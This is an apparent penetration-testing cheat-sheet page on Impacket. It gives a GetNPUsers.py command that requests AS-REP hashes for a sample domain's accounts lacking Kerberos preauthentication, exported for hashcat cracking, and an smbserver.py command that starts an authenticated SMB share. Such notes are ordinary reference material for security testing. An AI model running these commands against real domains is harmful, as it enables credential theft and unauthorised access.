# Impacket

## Enumeration

{% hint style="info" %}
**-format hashcat to export a formated hash**
{% endhint %}

### Account with doesn't require Kerberos Auth

```csharp
./GetNPUsers.py -dc-ip 10.110.0.222 -request 'crook.badcorp.local/' -format hashcat
```

## File server

```csharp
sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123 
```

